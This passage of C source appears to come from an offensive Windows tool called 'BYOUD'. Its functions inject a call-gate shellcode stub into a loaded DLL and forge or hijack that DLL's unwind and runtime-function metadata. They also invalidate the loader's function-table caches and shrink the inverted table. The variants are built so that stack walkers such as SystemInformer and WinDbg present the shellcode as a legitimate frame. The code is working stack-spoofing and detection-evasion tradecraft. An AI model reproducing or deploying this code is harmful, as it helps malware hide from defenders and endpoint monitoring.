    sf.AddrFrame.Offset = pCtx->Rsp;  sf.AddrFrame.Mode = AddrModeFlat;

    printf("[*] StackWalk64 from RIP=0x%016llX RSP=0x%016llX\n", pCtx->Rip, pCtx->Rsp);
    printf("%-4s %-18s %-18s %s\n", "#", "Child-SP", "RetAddr", "Call Site");

    while (StackWalk64(IMAGE_FILE_MACHINE_AMD64, hProcess, hThread,
        &sf, pCtx, NULL, SymFunctionTableAccess64, SymGetModuleBase64, NULL)) {
        char symBuf[sizeof(SYMBOL_INFO) + MAX_SYM_NAME];
        PSYMBOL_INFO pSym = (PSYMBOL_INFO)symBuf;
        IMAGEHLP_MODULE64 modInfo;
        DWORD64 disp = 0; BOOL symFound, modFound;

        memset(symBuf, 0, sizeof(symBuf));
        pSym->SizeOfStruct = sizeof(SYMBOL_INFO); pSym->MaxNameLen = MAX_SYM_NAME;
        symFound = SymFromAddr(hProcess, sf.AddrPC.Offset, &disp, pSym);
        memset(&modInfo, 0, sizeof(modInfo)); modInfo.SizeOfStruct = sizeof(IMAGEHLP_MODULE64);
        modFound = SymGetModuleInfo64(hProcess, sf.AddrPC.Offset, &modInfo);

        printf("%02d  0x%016llX  0x%016llX  ", frame, sf.AddrStack.Offset, sf.AddrReturn.Offset);
        if (modFound && symFound) printf("%s!%s+0x%llX", modInfo.ModuleName, pSym->Name, disp);
        else if (modFound)        printf("%s!0x%016llX", modInfo.ModuleName, sf.AddrPC.Offset);
        else                      printf("0x%016llX", sf.AddrPC.Offset);
        printf("\n");
        if (++frame > 30 || sf.AddrReturn.Offset == 0) break;
    }

    SymCleanup(hProcess);
    return TRUE;
}

BOOL TestUnwindRegistration(ULONG64 ShcAddress, ULONG64 BaseAddress, DWORD frameSize)
{
    ULONG64              imageBase = 0;
    UNWIND_HISTORY_TABLE history;
    PRUNTIME_FUNCTION    pRF;
    CONTEXT              ctx, ctxCopy, ctxCopy2;
    PVOID                handlerData = NULL;
    ULONG64              establisherFrame = 0;
    DWORD64              simulatedRsp;
    int                  i;

    memset(&history, 0, sizeof(history));

    pRF = RtlLookupFunctionEntry(ShcAddress, &imageBase, &history);

    /* Print history table regardless of result */
    printf("\n    UNWIND_HISTORY_TABLE:\n");
    printf("    Count       : %u\n", history.Count);
    printf("    Search      : %u\n", history.Search);
    printf("    LowAddress  : 0x%016llX\n", history.LowAddress);
    printf("    HighAddress : 0x%016llX\n", history.HighAddress);
    for (ULONG hi = 0; hi < history.Count && hi < UNWIND_HISTORY_TABLE_SIZE; hi++) {
        printf("    [%02u] ImageBase=0x%016llX FunctionEntry=0x%p\n",
            hi,
            history.Entry[hi].ImageBase,
            history.Entry[hi].FunctionEntry);
    }

    if (!pRF) {
        printf("[-] RtlLookupFunctionEntry returned NULL\n");
    }
    else {
        ULONG64  unwindAddr;
        PUNWIND_INFO pInfo;
        MEMORY_BASIC_INFORMATION mbi;
        BYTE* raw;

        printf("[+] Found RUNTIME_FUNCTION:\n");
        printf("    ImageBase    : 0x%016llX\n", imageBase);
        printf("    BeginAddress : 0x%08X -> abs 0x%016llX\n",
            pRF->BeginAddress, imageBase + pRF->BeginAddress);
        printf("    EndAddress   : 0x%08X -> abs 0x%016llX\n",
            pRF->EndAddress, imageBase + pRF->EndAddress);
        printf("    UnwindData   : 0x%08X -> abs 0x%016llX\n",
            pRF->UnwindData, imageBase + pRF->UnwindData);

        unwindAddr = imageBase + (pRF->UnwindData & ~1UL);
        if (!VirtualQuery((PVOID)unwindAddr, &mbi, sizeof(mbi)) || mbi.State != MEM_COMMIT) {
            printf("[!] UnwindData address 0x%016llX is NOT committed memory!\n", unwindAddr);
            return FALSE;
        }
        printf("    UnwindData memory: State=0x%X Protect=0x%X Type=0x%X\n",
            mbi.State, mbi.Protect, mbi.Type);

        pInfo = (PUNWIND_INFO)unwindAddr;
        raw = (BYTE*)pInfo;
        printf("\n    UNWIND_INFO raw dump:\n");
        for (i = 0; i < 32; i++) {
            if (i % 8 == 0) printf("    +%02X: ", i);
            printf("%02X ", raw[i]);
            if ((i + 1) % 8 == 0) printf("\n");
        }

        printf("\n    Version      : %d\n", pInfo->Version);
        printf("    Flags        : 0x%02X\n", pInfo->Flags);
        printf("    SizeOfProlog : 0x%02X\n", pInfo->SizeOfProlog);
        printf("    CountOfCodes : %d\n", pInfo->CountOfCodes);
        printf("    FrameRegister: %d\n", pInfo->FrameRegister);
        printf("    FrameOffset  : %d\n", pInfo->FrameOffset);

        for (i = 0; i < pInfo->CountOfCodes; i++) {
            printf("    Code[%d]: CodeOffset=0x%02X UnwindOp=%d OpInfo=%d FrameOffset=0x%04X\n",
                i, pInfo->UnwindCode[i].CodeOffset, pInfo->UnwindCode[i].UnwindOp,
                pInfo->UnwindCode[i].OpInfo, pInfo->UnwindCode[i].FrameOffset);
        }

        if (imageBase != BaseAddress)
            printf("[!] ImageBase MISMATCH: got 0x%016llX expected 0x%016llX\n",
                imageBase, BaseAddress);
        else
            printf("[+] ImageBase matches BaseAddress\n");
    }

    memset(&ctx, 0, sizeof(ctx));
    RtlCaptureContext(&ctx);
    simulatedRsp = ctx.Rsp - frameSize - 8;
    ctx.Rip = ShcAddress + 0x26;
    ctx.Rsp = simulatedRsp;
    ctxCopy = ctx;
    ctxCopy2 = ctx;

    printf("Before RtlVirtualUnwind:\n");
    printf("  RSP            : 0x%016llX\n", ctx.Rsp);
    printf("  RIP            : 0x%016llX\n", ctx.Rip);

    RtlVirtualUnwind(UNW_FLAG_NHANDLER, imageBase, ctx.Rip,
        pRF, &ctx, &handlerData, &establisherFrame, NULL);

    printf("After RtlVirtualUnwind:\n");
    printf("  RSP            : 0x%016llX\n", ctx.Rsp);
    printf("  RIP            : 0x%016llX\n", ctx.Rip);
    printf("  EstablisherFrame: 0x%016llX\n", establisherFrame);
    printf("  Expected RSP    : 0x%016llX\n", simulatedRsp + frameSize + 8);
    printf("  RSP correct     : %s\n",
        ctx.Rsp == simulatedRsp + frameSize + 8 ? "YES" : "NO");

    //TestStackWalk64Callback(&ctxCopy);
    //TestStackWalk64(&ctxCopy2);
    return TRUE;
}

/* ---------------------------------------------------------------
 * RuntimeFunctionInstall — SystemInformer variant
 * Updated: takes PBYOUD_CONTEXT, drops PRUNTIME_FUNCTION_BACKUP*.
 * --------------------------------------------------------------- */
BOOL RuntimeFunctionInstall(PBYOUD_CONTEXT ctx, HMODULE hModule,
    DWORD dwShcOffset, DWORD dwShcSize, DWORD dwDesiredSize, PDWORD pdwActualSize)
{
    PRUNTIME_FUNCTION       FunctionTable;
    PRUNTIME_FUNCTION       targetFunction;
    PDYNAMIC_FUNCTION_TABLE pEntry;
    SECTION_INFO            si;
    ULONG64                 cacheAddr = 0;
    DWORD                   cacheOld = 0;
    DWORD                   oldProtect;

    FunctionTable = (PRUNTIME_FUNCTION)malloc(sizeof(RUNTIME_FUNCTION));
    if (FunctionTable == NULL) return FALSE;

    targetFunction = SearchRtFunctionWithSpecificSize(
        hModule, dwDesiredSize, FALSE, pdwActualSize);
    if (targetFunction == NULL) { free(FunctionTable); return FALSE; }

    FunctionTable->BeginAddress = dwShcOffset;
    FunctionTable->EndAddress = dwShcOffset + dwShcSize;
    FunctionTable->UnwindData = targetFunction->UnwindData;

    GetPdataSectionInfo(hModule, &si);
    {
        MEMORY_BASIC_INFORMATION mbi;
        VirtualQuery(si.Address, &mbi, sizeof(mbi));
        oldProtect = mbi.Protect;
    }
    ByoudTrackPdataProtect(ctx, BCT_PDATA_PROTECT, hModule,
        si.Address, (si.Size + 0xFFF) & ~0xFFF, oldProtect);

    UnprotectPdata(hModule);

    InvalidateFunctionTableCache(&cacheAddr, &cacheOld);
    if (cacheAddr) ByoudTrackCacheZero(ctx, cacheAddr, cacheOld);

    cacheAddr = 0; cacheOld = 0;
    InvalidateFunctionEntryCache(&cacheAddr, &cacheOld);
    if (cacheAddr) ByoudTrackCacheZero(ctx, cacheAddr, cacheOld);

    ProtectPdata(hModule);

    if (!RtlAddFunctionTable(FunctionTable, 1, (DWORD64)hModule)) {
        free(FunctionTable);
        return FALSE;
    }
    ByoudTrackDynamicAdd(ctx, FunctionTable);

    pEntry = FindLocalDynamicFunctionTable((ULONG64)hModule + dwShcOffset);
    if (NULL == pEntry) {
        printf("[-] No Entry found in _DYNAMIC_FUNCTION_TABLE for @ 0x%llx\n",
            (ULONG64)hModule + dwShcOffset);
        return FALSE;
    }

    printf("[*] Found our _DYNAMIC_FUNCTION_TABLE @ 0x%p\n", pEntry);
    printf("    Type before: %u\n", pEntry->Type);
    ByoudTrackDynamicType(ctx, (PVOID)pEntry, pEntry->Type);
    pEntry->Type = 1;
    printf("    Type after : %u\n", pEntry->Type);

    return TRUE;
}

/* ---------------------------------------------------------------
 * RuntimeFunctionInstallWinDbg — WinDbg variant
 * Updated: takes PBYOUD_CONTEXT, drops PRUNTIME_FUNCTION_BACKUP*.
 * --------------------------------------------------------------- */
BOOL RuntimeFunctionInstallWinDbg(PBYOUD_CONTEXT ctx, HMODULE hModule,
    DWORD dwShcOffset, DWORD dwShcSize, DWORD dwDesiredSize, PDWORD pdwActualSize)
{
    PRUNTIME_FUNCTION       FunctionTable;
    PRUNTIME_FUNCTION       targetFunction;
    PDYNAMIC_FUNCTION_TABLE pEntry;
    SECTION_INFO            si;
    ULONG                   oldInvSize = 0;
    ULONG64                 cacheAddr = 0;
    DWORD                   cacheOld = 0;
    DWORD                   oldProtect = 0;
    DWORD                   pdataOld;

    FunctionTable = (PRUNTIME_FUNCTION)malloc(sizeof(RUNTIME_FUNCTION));
    if (FunctionTable == NULL) return FALSE;

    targetFunction = SearchRtFunctionWithSpecificSize(
        hModule, dwDesiredSize, FALSE, pdwActualSize);
    if (targetFunction == NULL) { free(FunctionTable); return FALSE; }

    FunctionTable->BeginAddress = dwShcOffset;
    FunctionTable->EndAddress = dwShcOffset + dwShcSize;
    FunctionTable->UnwindData = targetFunction->UnwindData;

    GetPdataSectionInfo(hModule, &si);
    VirtualProtect(si.Address, (si.Size + 0xFFF) & ~0xFFF, PAGE_READWRITE, &pdataOld);
    ByoudTrackPdataProtect(ctx, BCT_PDATA_PROTECT, hModule,
        si.Address, (si.Size + 0xFFF) & ~0xFFF, pdataOld);

    ShrinkInvertedFunctionTableEntry(hModule, (ULONG64)hModule + dwShcOffset, &oldInvSize);
    ByoudTrackInvertedTableShrink(ctx, hModule, oldInvSize);

    InvalidateFunctionTableCache(&cacheAddr, &cacheOld);
    if (cacheAddr) ByoudTrackCacheZero(ctx, cacheAddr, cacheOld);

    cacheAddr = 0; cacheOld = 0;
    InvalidateFunctionEntryCache(&cacheAddr, &cacheOld);
    if (cacheAddr) ByoudTrackCacheZero(ctx, cacheAddr, cacheOld);

    ProtectPdata(hModule);

    if (!RtlAddFunctionTable(FunctionTable, 1, (DWORD64)hModule)) {
        free(FunctionTable);
        return FALSE;
    }
    ByoudTrackDynamicAdd(ctx, FunctionTable);

    pEntry = FindLocalDynamicFunctionTable((ULONG64)hModule + dwShcOffset);
    if (NULL == pEntry) {
        printf("[-] No Entry found in _DYNAMIC_FUNCTION_TABLE for @ 0x%llx\n",
            (ULONG64)hModule + dwShcOffset);
        return FALSE;
    }

    printf("[*] Found our _DYNAMIC_FUNCTION_TABLE @ 0x%p\n", pEntry);
    printf("    Type before: %u\n", pEntry->Type);
    ByoudTrackDynamicType(ctx, (PVOID)pEntry, pEntry->Type);
    pEntry->Type = 0;
    printf("    Type after : %u\n", pEntry->Type);

    /* Track PAGE_NOACCESS separately with correct base/size */
    {
        PVOID  pdataBase = si.Address;
        SIZE_T pdataSize = (si.Size + 0xFFF) & ~0xFFF;
        VirtualProtect(pdataBase, pdataSize, PAGE_NOACCESS, &oldProtect);
        ByoudTrackPdataProtect(ctx, BCT_PDATA_NOACCESS, hModule,
            pdataBase, pdataSize, oldProtect);
        printf("[+] .pdata @ 0x%p set to PAGE_NOACCESS\n", pdataBase);
    }

    return TRUE;
}

/* ---------------------------------------------------------------
 * UnRegisterShellcode — unified restore via BYOUD_CONTEXT
 * --------------------------------------------------------------- */
BOOL UnRegisterShellcode(PBYOUD_CONTEXT ctx)
{
    if (!ctx) return FALSE;
    return ByoudRestoreAll(ctx);
}

/* ---------------------------------------------------------------
 * RegisterShellcode
 * Takes PBYOUD_CONTEXT (may be NULL for RT_FUNCTION_INJECT).
 * Drops separate PRUNTIME_FUNCTION_BACKUP* — changes are tracked
 * into ctx instead.
 * --------------------------------------------------------------- */
BOOL RegisterShellcode(PBYOUD_CONTEXT ctx, LPCSTR dllName, DWORD unwindSize,
    PDWORD pActualSize, DWORD technique, PCALLGATE_COPY_INFO pCopyInfo)
{
    IMAGE_RUNTIME_FUNCTION_ENTRY function;
    DWORD   unwindAddress = 0;
    DWORD   beginAddress = 0;
    DWORD   actualSize = 0;
    HMODULE hTarget;

    memset(&function, 0, sizeof(function));

    printf("[RegisterShellcode] dllName: %s, unwindSize: 0x%x, technique: %d\n",
        dllName, unwindSize, technique);

    if (pCopyInfo == NULL) {
        printf("[RegisterShellcode] FAIL: pCopyInfo is NULL\n");
        return FALSE;
    }

    memset(pCopyInfo, 0, sizeof(CALLGATE_COPY_INFO));

    if (!GetCallGateInfo(pCopyInfo)) {
        printf("[RegisterShellcode] FAIL: GetCallGateInfo failed\n");
        return FALSE;
    }
    printf("[RegisterShellcode] CallGate source: 0x%p, size: 0x%x\n",
        pCopyInfo->pSourceAddress, pCopyInfo->dwSize);

    hTarget = LoadLibraryA(dllName);
    if (!hTarget) {
        printf("[RegisterShellcode] FAIL: LoadLibraryA failed for '%s', error: %lu\n",
            dllName, GetLastError());
        return FALSE;
    }
    if (ctx) ctx->hTargetModule = hTarget;
    printf("[RegisterShellcode] Target module loaded at: 0x%p\n", hTarget);

    /* ---- Place shellcode ---- */
    if (technique != RTFI_JIT_NORMAL_VA) {
        if (!AppendCodeText(hTarget, pCopyInfo->pSourceAddress,
            pCopyInfo->dwSize, &beginAddress)) {
            printf("[RegisterShellcode] FAIL: AppendCodeText failed\n");
            FreeLibrary(hTarget);
            return FALSE;
        }
        printf("[RegisterShellcode] Code appended at offset: 0x%x (VA: 0x%p)\n",
            beginAddress, (PVOID)((UINT64)hTarget + beginAddress));
        pCopyInfo->pCopiedAddress = (PVOID)((UINT64)hTarget + beginAddress);
        if (ctx)
            ByoudTrackShellcodeAppended(ctx, hTarget,
                pCopyInfo->pCopiedAddress, pCopyInfo->dwSize);
    }

    /*
    else if (technique == RTFI_JIT_WINDBG) {
        PVOID pShellcode = AllocateAdjacentToModule(
            hTarget, pCopyInfo->dwSize, MAXDWORD32, PAGE_EXECUTE_READWRITE);
        if (NULL == pShellcode) {
            printf("[RegisterShellcode] Couldn't Allocate Near to module\n");
            return FALSE;
        }
        memcpy(pShellcode, pCopyInfo->pSourceAddress, pCopyInfo->dwSize);
        pCopyInfo->pCopiedAddress = pShellcode;
        beginAddress = (DWORD)DistanceFromModule(hTarget, pShellcode);
        if (ctx) ByoudTrackShellcodeVA(ctx, pShellcode, pCopyInfo->dwSize);
    }
    else {
        PVOID pShellcode = VirtualAlloc(NULL, pCopyInfo->dwSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (NULL == pShellcode) return FALSE;
        memcpy(pShellcode, pCopyInfo->pSourceAddress, pCopyInfo->dwSize);
        pCopyInfo->pCopiedAddress = pShellcode;
        beginAddress = 0;
        if (ctx) ByoudTrackShellcodeVA(ctx, pShellcode, pCopyInfo->dwSize);
    }

    /* ---- Technique-specific install ---- */
    if (technique == RT_FUNCTION_INJECT) {
        UBYTE unwindBuffer[64];
        DWORD unwindInfoSize;

        memset(unwindBuffer, 0, sizeof(unwindBuffer));
        actualSize = (8 * 8) + 0xf8;
        unwindSize += actualSize;
        *pActualSize = actualSize;

        printf("[RegisterShellcode] Technique: RT_FUNCTION_INJECT\n");

        unwindInfoSize = CreateUnwind(
            (PUNWIND_INFO)unwindBuffer, unwindSize, 1, FALSE);
        if (unwindInfoSize == 0) {
            printf("[RegisterShellcode] FAIL: CreateUnwind failed\n");
            FreeLibrary(hTarget);
            return FALSE;
        }
        printf("[RegisterShellcode] Unwind info created\n");

        if (!AppendUnwindData(hTarget, (PUNWIND_INFO)unwindBuffer, &unwindAddress)) {
            printf("[RegisterShellcode] FAIL: AppendUnwindData failed\n");
            FreeLibrary(hTarget);
            return FALSE;
        }
        printf("[RegisterShellcode] Unwind data appended at offset: 0x%x\n", unwindAddress);

        function.BeginAddress = beginAddress;
        function.EndAddress = beginAddress + pCopyInfo->dwSize;
        function.UnwindData = unwindAddress;
        printf("[RegisterShellcode] RUNTIME_FUNCTION: Begin=0x%x, End=0x%x, Unwind=0x%x\n",
            function.BeginAddress, function.EndAddress, function.UnwindData);

        if (!AppendRuntimeFunctionToExceptionDirectory(hTarget, &function)) {
            printf("[RegisterShellcode] FAIL: AppendRuntimeFunctionToExceptionDirectory failed\n");
            FreeLibrary(hTarget);
            return FALSE;
        }
        printf("[RegisterShellcode] SUCCESS: RT_FUNCTION_INJECT complete\n");
        return TRUE;
    }
    else if (technique == RT_FUNCTION_HIJACK) {
        PRUNTIME_FUNCTION_BACKUP prtfBackup = NULL;

        printf("[RegisterShellcode] Technique: RT_FUNCTION_HIJACK\n");
        if (pActualSize == NULL) {
            printf("[RegisterShellcode] FAIL: pActualSize is NULL\n");
            FreeLibrary(hTarget); return FALSE;
        }

        function.BeginAddress = beginAddress;
        function.EndAddress = beginAddress + pCopyInfo->dwSize;
        printf("[RegisterShellcode] Function range: 0x%x - 0x%x\n",
            function.BeginAddress, function.EndAddress);

        if (!UnprotectPdata(hTarget)) {
            printf("[RegisterShellcode] FAIL: UnprotectPdata\n");
            FreeLibrary(hTarget); return FALSE;
        }

        printf("Unwind SIZE 0x%08x\n", unwindSize);

        if (!HijackRuntimeFunction(hTarget, &function, unwindSize, FALSE,
            &actualSize, &prtfBackup)) {
            printf("[RegisterShellcode] FAIL: HijackRuntimeFunction failed\n");
            FreeLibrary(hTarget); return FALSE;
        }

        /* Track into context if provided */
        if (ctx && prtfBackup) {
            BYOUD_CHANGE c;
            memset(&c, 0, sizeof(c));
            c.Type = BCT_RUNTIME_FUNCTION;
            c.u.RuntimeFunction.hModule = hTarget;
            c.u.RuntimeFunction.pOriginalLocation = prtfBackup->pOriginalLocation;
            c.u.RuntimeFunction.OldValue = prtfBackup->Data;
            ByoudPushChange(ctx, &c);
            FreeRuntimeFunctionBackup(prtfBackup);
        }

        if (!ProtectPdata(hTarget)) {
            printf("[RegisterShellcode] FAIL: ProtectPdata\n");
            FreeLibrary(hTarget); return FALSE;
        }

        printf("[RegisterShellcode] Hijacked with actual size: 0x%x\n", actualSize);
        *pActualSize = actualSize;
        printf("[RegisterShellcode] SUCCESS: RT_FUNCTION_HIJACK complete\n");
        return TRUE;
    }
    else if (technique == RTFI_JIT_SYSINFORMER) {
        printf("[RegisterShellcode] Technique: RTFI_JIT_SYSINFORMER\n");
        if (pActualSize == NULL) {
            printf("[RegisterShellcode] FAIL: pActualSize is NULL\n");
            FreeLibrary(hTarget); return FALSE;
        }

        printf("[RegisterShellcode] Installing: offset=0x%x, size=0x%x, unwindSize=0x%x\n",
            beginAddress, pCopyInfo->dwSize, unwindSize);

        if (!RuntimeFunctionInstall(ctx, hTarget, beginAddress,
            pCopyInfo->dwSize, unwindSize, &actualSize)) {
            printf("[RegisterShellcode] FAIL: RuntimeFunctionInstall failed\n");
            FreeLibrary(hTarget); return FALSE;
        }
        printf("[RegisterShellcode] JIT installed with actual size: 0x%x\n", actualSize);
        *pActualSize = actualSize;
        printf("[RegisterShellcode] SUCCESS: RTFI_JIT_SYSINFORMER complete\n");
        return TRUE;
    }
    else if (technique == RTFI_JIT_WINDBG) {
        printf("[RegisterShellcode] Technique: RTFI_JIT_WINDBG\n");
        if (pActualSize == NULL) {
            printf("[RegisterShellcode] FAIL: pActualSize is NULL\n");
            FreeLibrary(hTarget); return FALSE;
        }

        printf("[RegisterShellcode] Installing: offset=0x%x, size=0x%x, unwindSize=0x%x\n",
            beginAddress, pCopyInfo->dwSize, unwindSize);

        if (!RuntimeFunctionInstallWinDbg(ctx, hTarget, beginAddress,
            pCopyInfo->dwSize, unwindSize, &actualSize)) {
            printf("[RegisterShellcode] FAIL: RuntimeFunctionInstallWinDbg failed\n");
            FreeLibrary(hTarget); return FALSE;
        }
        printf("[RegisterShellcode] JIT installed with actual size: 0x%x\n", actualSize);
        *pActualSize = actualSize;
        printf("[RegisterShellcode] SUCCESS: RTFI_JIT_WINDBG complete\n");
        return TRUE;
    }
    else if (technique == RTFI_JIT_NORMAL_VA) {
        PRUNTIME_FUNCTION_BACKUP prtfBackup = NULL;

        printf("[RegisterShellcode] Technique: RTFI_JIT_NORMAL_VA\n");
        if (pActualSize == NULL) {
            printf("[RegisterShellcode] FAIL: pActualSize is NULL\n");
            FreeLibrary(hTarget); return FALSE;
        }

        printf("[RegisterShellcode] Installing: offset=0x%x, size=0x%x, unwindSize=0x%x\n",
            beginAddress, pCopyInfo->dwSize, unwindSize);

        actualSize = (6 * 8) + 0xf8;
        unwindSize += actualSize;

        if (!RuntimeFunctionInstallCustomUnwind(
            (ULONG64)pCopyInfo->pCopiedAddress, 0,
            pCopyInfo->dwSize, unwindSize, &actualSize, &prtfBackup)) {
            printf("[RegisterShellcode] FAIL: RuntimeFunctionInstallCustomUnwind failed\n");
            FreeLibrary(hTarget); return FALSE;
        }

        /* Track the dynamic table entry */
        if (ctx && prtfBackup) {
            ByoudTrackDynamicAdd(ctx, prtfBackup->pOriginalLocation);
            FreeRuntimeFunctionBackup(prtfBackup);
        }

        printf("[RegisterShellcode] JIT installed with actual size: 0x%x\n", actualSize);
        *pActualSize = actualSize;
        printf("[RegisterShellcode] SUCCESS: RTFI_JIT_NORMAL_VA complete\n");
        return TRUE;
    }
    else {
        printf("[RegisterShellcode] FAIL: Unknown technique: %d\n", technique);
        FreeLibrary(hTarget);
        return FALSE;
    }
}

/* ---------------------------------------------------------------
 * CallGate / module helpers  (original, unchanged)
 * --------------------------------------------------------------- */
PVOID ResolveJmpTarget(PVOID pAddress)
{
    PBYTE p = (PBYTE)pAddress;
    if (p[0] == 0xE9) {
        INT32 offset = *(INT32*)(p + 1);
        return (PVOID)(p + 5 + offset);
    }
    if (p[0] == 0xFF && p[1] == 0x25) {
        INT32  offset = *(INT32*)(p + 2);
        PVOID* pTarget = (PVOID*)(p + 6 + offset);
        return *pTarget;
    }
    if (p[0] == 0x48 && p[1] == 0xFF && p[2] == 0x25) {
        INT32  offset = *(INT32*)(p + 3);
        PVOID* pTarget = (PVOID*)(p + 7 + offset);
        return *pTarget;
    }
    return pAddress;
}

PVOID ResolveJmpTargetFull(PVOID pAddress)
{
    PVOID resolved = pAddress;
    PVOID prev = NULL;
    int   i;
    for (i = 0; i < 5 && resolved != prev; i++) {
        prev = resolved;
        resolved = ResolveJmpTarget(resolved);
    }
    return resolved;
}

HMODULE GetCurrentModule(void)
{
    HMODULE hMod = GetModuleHandleA("byoud");
    printf("BYOUD HMODULE %p\n", hMod);
    return hMod;
}

BOOL GetCallGateInfo(PCALLGATE_COPY_INFO pInfo)
{
    HMODULE hSelf;
    PVOID   pCallGate, pResolved;
    DWORD   dwSize;

    if (pInfo == NULL) return FALSE;
    hSelf = GetCurrentModule();
    if (hSelf == NULL) return FALSE;

    pCallGate = GetProcAddress(hSelf, "CallGate");
    if (pCallGate == NULL) return FALSE;

    pResolved = ResolveJmpTargetFull(pCallGate);
    if (pResolved != pCallGate) {
        printf("[GetCallGateInfo] Resolved JMP to: 0x%p\n", pResolved);
        pCallGate = pResolved;
    }

    dwSize = GetFunctionSizeByAddress(hSelf, pCallGate);
    if (dwSize == 0) {
        BYTE* p = (BYTE*)pCallGate;
        DWORD j;
        for (j = 2; j < 0x500; j++) {
            if (p[j - 2] == 0x5D && p[j - 1] == 0x5B && p[j] == 0xC3) {
                dwSize = j + 1;
                break;
            }
        }
        if (dwSize == 0) dwSize = 0x120;
    }

    pInfo->pSourceAddress = pCallGate;
    pInfo->dwSize = dwSize;
    pInfo->pCopiedAddress = NULL;
    return TRUE;
}

BOOL CopyCallGateTo(PVOID pDestination, PCALLGATE_COPY_INFO pInfo)
{
    DWORD oldProtect;
    if (pDestination == NULL || pInfo == NULL) return FALSE;
    if (pInfo->pSourceAddress == NULL || pInfo->dwSize == 0)
        if (!GetCallGateInfo(pInfo)) return FALSE;

    if (!VirtualProtect(pDestination, pInfo->dwSize, PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;
    internal_memcpy(pDestination, pInfo->pSourceAddress, pInfo->dwSize);
    VirtualProtect(pDestination, pInfo->dwSize, oldProtect, &oldProtect);
    pInfo->pCopiedAddress = pDestination;
    return TRUE;
}

BOOL RelocateCallGate(HMODULE hTargetModule)
{
    CALLGATE_COPY_INFO info;
    DWORD copiedAddress;
    memset(&info, 0, sizeof(info));
    if (!GetCallGateInfo(&info)) return FALSE;
    if (!AppendCodeText(hTargetModule, info.pSourceAddress, info.dwSize, &copiedAddress))
        return FALSE;
    info.pCopiedAddress = (BYTE*)hTargetModule + copiedAddress;
    return TRUE;
}

void* AllocateAdjacentToModuleBidirectional(HMODULE targetModule, SIZE_T size,
    SIZE_T maxDistance, DWORD protect)
{
    SYSTEM_INFO si;
    MODULEINFO  mi;
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T    granularity;
    uintptr_t modBase, modEnd, minAddr, maxAddr;
    uintptr_t probeBelow, probeAbove;
    int       exhaustedBelow, exhaustedAbove;
    void* ptr;

    GetSystemInfo(&si);
    granularity = si.dwAllocationGranularity;
    GetModuleInformation(GetCurrentProcess(), targetModule, &mi, sizeof(mi));
    modBase = (uintptr_t)mi.lpBaseOfDll;
    modEnd = modBase + mi.SizeOfImage;
    minAddr = (uintptr_t)si.lpMinimumApplicationAddress;
    maxAddr = (uintptr_t)si.lpMaximumApplicationAddress;

    probeBelow = (modBase / granularity) * granularity;
    probeAbove = ((modEnd + granularity - 1) / granularity) * granularity;

    for (;;) {
        exhaustedBelow = (probeBelow < minAddr || probeBelow < granularity ||
            modBase - probeBelow > maxDistance);
        exhaustedAbove = (probeAbove > maxAddr || probeAbove - modBase > maxDistance);
        if (exhaustedBelow && exhaustedAbove) break;

        if (!exhaustedBelow) {
            if (VirtualQuery((LPCVOID)probeBelow, &mbi, sizeof(mbi)) &&
                mbi.State == MEM_FREE && mbi.RegionSize >= size) {
                ptr = VirtualAlloc((LPVOID)probeBelow, size,
                    MEM_COMMIT | MEM_RESERVE, protect);
                if (ptr) return ptr;
            }
            if (probeBelow >= granularity) probeBelow -= granularity;
            else probeBelow = 0;
        }

        if (!exhaustedAbove) {
            if (VirtualQuery((LPCVOID)probeAbove, &mbi, sizeof(mbi)) &&
                mbi.State == MEM_FREE && mbi.RegionSize >= size) {
                ptr = VirtualAlloc((LPVOID)probeAbove, size,
                    MEM_COMMIT | MEM_RESERVE, protect);
                if (ptr) return ptr;
            }
            probeAbove += granularity;
        }
    }
    return NULL;
}

void* AllocateAdjacentToModule(HMODULE targetModule, SIZE_T size,
    SIZE_T maxDistance, DWORD protect)
{
    SYSTEM_INFO si;
    MODULEINFO  mi;
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T    granularity;
    uintptr_t modBase, modEnd, maxAddr, probe;
    void* ptr;

    GetSystemInfo(&si);
    granularity = si.dwAllocationGranularity;
    GetModuleInformation(GetCurrentProcess(), targetModule, &mi, sizeof(mi));
    modBase = (uintptr_t)mi.lpBaseOfDll;
    modEnd = modBase + mi.SizeOfImage;
    maxAddr = (uintptr_t)si.lpMaximumApplicationAddress;

    probe = ((modEnd + granularity - 1) / granularity) * granularity;

    while (probe <= maxAddr && probe - modBase <= maxDistance) {
        if (VirtualQuery((LPCVOID)probe, &mbi, sizeof(mbi)) &&
            mbi.State == MEM_FREE && mbi.RegionSize >= size) {
            ptr = VirtualAlloc((LPVOID)probe, size, MEM_COMMIT | MEM_RESERVE, protect);
            if (ptr) return ptr;
        }
        probe += granularity;
    }
    return NULL;
}

SIZE_T DistanceFromModule(HMODULE targetModule, void* address)
{
    MODULEINFO mi;
    uintptr_t  modBase, modEnd, addr;
    GetModuleInformation(GetCurrentProcess(), targetModule, &mi, sizeof(mi));
    modBase = (uintptr_t)mi.lpBaseOfDll;
    modEnd = modBase + mi.SizeOfImage;
    addr = (uintptr_t)address;
    if (addr >= modBase && addr < modEnd) return 0;
    if (addr < modBase) return (SIZE_T)(modBase - addr);
    return (SIZE_T)(addr - modEnd);
}

/* ---------------------------------------------------------------
 * ShieldedExecution
 * Original structure fully preserved. goto done ensures
 * ByoudRestoreAll always runs for tracked techniques.
 * --------------------------------------------------------------- */
UINT64 CALLBACK ShieldedExecution(HMODULE hModule, LPSTR lpFunctionName,
    DWORD dwArgc, DWORD64* pqwArgv, DWORD technique)
{
    SECTION_INFO   textSectionInfo;
    BYOUD_CONTEXT  ctx;
    PVOID          functionPointer = NULL;
    uint64_t       stackPointer = 0;
    uint64_t       stackSpace;
    DWORD          functionOffset = 0;
    DWORD          oldFrameSize;
    PIMAGE_RUNTIME_FUNCTION_ENTRY runtimeFunction = NULL;
    DWORD          tSize = 0;
    PRUNTIME_FUNCTION pRuntimeFunctionTable = NULL;
    PUNWIND_INFO   pInfo = NULL;
    DWORD          unwSide = 0;
    DWORD64        rspHere = 0;
    UINT64         rax = 0;
    PUNWIND_BACKUP puwBackup = NULL;
    CALLGATE_COPY_INFO copyInfo;

    memset(&ctx, 0, sizeof(ctx));
    memset(&copyInfo, 0, sizeof(copyInfo));

    GetTextSectionInfo(hModule, (PSECTION_INFO)&textSectionInfo);

    stackSpace = GetStackBtitAddress(&stackPointer);
